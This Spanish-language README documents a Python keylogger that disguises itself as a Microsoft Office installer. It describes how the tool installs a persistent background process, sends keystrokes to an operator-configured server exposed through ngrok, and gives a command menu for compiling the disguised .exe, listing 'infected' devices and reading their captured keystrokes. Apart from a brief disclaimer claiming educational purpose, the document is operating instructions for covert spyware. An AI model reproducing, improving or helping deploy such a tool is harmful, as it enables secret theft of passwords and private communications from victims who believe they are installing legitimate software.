# Keylogger - Instalador de Office

Este proyecto consiste en un keylogger escrito en Python, que simula ser un instalador de Office. El keylogger se ejecuta en segundo plano y envía las pulsaciones de teclas a un servidor configurado por el usuario. A pesar de que el archivo `office.exe` puede ser eliminado, el archivo `officemonitor.exe` permanece en el sistema como un proceso persistente.

## Requerimientos

- `python3`
- `pip`

## Cómo usar


```git clone https://github.com/devcodejss/KeyLogger```
```cd KeyLogger```
```pip install -r requirements.txt```
```python jslog.py```

## Características

- **Interfaz de instalación**: Simula el proceso de instalación de Office.
- **Permanente en el sistema**: Una vez ejecutado, el keylogger se ejecuta de forma persistente.
- **Servidor configurable**: Permite configurar el servidor donde se recibirán las pulsaciones de teclas.
- **Servidor local**: Opción para iniciar un servidor local y elegir el puerto (por defecto 5000).
- **Opciones de menú**:
  - **Compilar Keylogger**: Genera el archivo `.exe` con el keylogger.
  - **Listar infectados**: Muestra los dispositivos infectados.
  - **Leer pulsaciones**: Lee las pulsaciones de teclas enviadas desde los dispositivos infectados.
  - **Abrir infectado**: Abre el archivo infectado en el sistema.
  - **Cerrar servidor local**: Cierra el servidor local.
  - **Ver URL del servidor actual**: Muestra la URL del servidor configurado.
  - **Cambiar URL del servidor actual**: Permite cambiar la URL del servidor configurado.
  - **Salir**: Cierra el script.

## Uso

1. **Configurar el servidor**:
   - Si aún no tienes un servidor configurado, usa la opción 5 para iniciar un servidor local en el puerto que elijas (por defecto 5000).
   - Obtén la URL del servidor mediante un túnel (por ejemplo, usando ngrok) o como prefieras.
   
2. **Compilar el Keylogger**:
   - Una vez que hayas configurado la URL del servidor, utiliza la opción 1 para compilar el keylogger en un archivo `.exe`.

3. **Monitorear dispositivos infectados**:
   - Usa la opción 2 para listar los dispositivos infectados si el servidor está configurado correctamente.

4. **Leer pulsaciones**:
   - La opción 3 te permitirá leer las pulsaciones de teclas enviadas desde los dispositivos infectados.

5. **Abrir infectados**:
   - La opción 4 te permite abrir el archivo infectado.

6. **Gestión del servidor**:
   - Usa la opción 6 para cerrar el servidor local.
   - La opción 7 te muestra la URL del servidor actual.
   - La opción 8 te permite cambiar la URL del servidor.

## Parámetros

- `-h`, `--help`: Muestra este mensaje de ayuda y termina.
- `-1`, `-c`, `--compilar`: Compila el Keylogger.
- `-2`, `-ls`, `--listar`: Lista los dispositivos infectados.
- `-3 VER_ARCHIVO`, `-v VER_ARCHIVO`, `--ver-archivo VER_ARCHIVO`: Lee un infectado específico.
- `-4 EJECUTAR_ARCHIVO`, `-o EJECUTAR_ARCHIVO`, `--ejecutar-archivo EJECUTAR_ARCHIVO`: Abre un infectado específico.
- `-5`, `-iS`, `--iniciar-servidor`: Inicia un servidor local.
- `-6`, `-dS`, `--cerrar-servidor`: Cierra el servidor local.
- `-7`, `-u`, `--ver-url`: Muestra la URL del servidor actual.
- `-8 CAMBIAR_URL`, `-cU CAMBIAR_URL`, `--cambiar-url CAMBIAR_URL`: Cambia la URL del servidor.
- `-9`, `-m`, `--menu`: Muestra el menú.

## Descargo de Responsabilidad

Este proyecto se proporciona solo con fines educativos y de investigación en ciberseguridad. **No utilices este software para fines maliciosos, ilegales o no autorizados**. El uso de este script para espiar o intervenir en dispositivos ajenos sin consentimiento es ilegal y está en contra de las leyes de muchos países. El autor no se hace responsable del uso indebido de este software.

---

> **¡Advertencia!** El uso de este software es bajo tu propio riesgo. Asegúrate de cumplir con todas las leyes y regulaciones locales relacionadas con la ciberseguridad y la privacidad.
